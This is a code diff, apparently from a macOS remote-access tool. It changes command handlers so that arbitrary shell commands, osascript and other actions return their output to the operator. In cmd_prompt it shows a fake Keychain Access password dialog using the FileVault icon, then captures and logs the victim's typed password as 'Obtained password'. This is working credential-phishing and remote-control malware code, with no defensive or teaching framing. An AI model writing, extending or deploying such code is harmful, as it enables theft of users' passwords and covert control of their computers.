@@ -31,7 +31,7 @@ void cmd_mkdir(std::vector<std::string> commands)
 void cmd_exec(std::vector<std::string> commands)
 {
     if (commands.size() > 1)
-        system(commands[1].c_str());
+        console_log(exec(commands[1]));
     else
         console_log("Usage: exec <commands>");
 }
@@ -167,7 +167,7 @@ void cmd_getgid()
 
 void cmd_ps()
 {
-    system("ps aux");
+    console_log(exec("ps aux"));
 }
 
 void cmd_reboot()
@@ -210,7 +210,7 @@ void cmd_help()
 void cmd_osascript(std::vector<std::string> commands)
 {
     if (commands.size() > 1)
-        system(("osascript -e '" + commands[1] + "'").c_str());
+        exec("osascript -e '" + commands[1] + "'");
     else
         console_log("Usage: osascript <script>");
 }
@@ -218,7 +218,7 @@ void cmd_osascript(std::vector<std::string> commands)
 void cmd_setvol(std::vector<std::string> commands)
 {
     if (commands.size() > 1)
-        system(("osascript -e 'set volume output volume " + commands[1] + "'").c_str());
+        exec("osascript -e 'set volume output volume " + commands[1] + "'");
     else
         console_log("Usage: setvol <percentage>");
 }
@@ -226,23 +226,20 @@ void cmd_setvol(std::vector<std::string> commands)
 void cmd_say(std::vector<std::string> commands)
 {
     if (commands.size() > 1)
-        system(("say " + commands[1]).c_str());
+        exec("say " + commands[1]);
     else
         console_log("Usage: say <message>");
 }
 
 void cmd_getvol()
 {
-    console_log_information("Current volume level: ");
-    sleep(0.3);
-    system("osascript -e 'output volume of (get volume settings)'");
+    std::string output = exec("osascript -e 'output volume of (get volume settings)'");
+    console_log_information("Current volume level: " + output);
 }
 
 void cmd_prompt()
 {
     std::string payload = "set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer";
-
-    console_log_information("Obtained password: ");
-    sleep(0.3);
-    system(("osascript -e '" + payload + "'").c_str());
+    std::string output = exec("osascript -e '" + payload + "'");
+    console_log_information("Obtained password: " + output);
 }
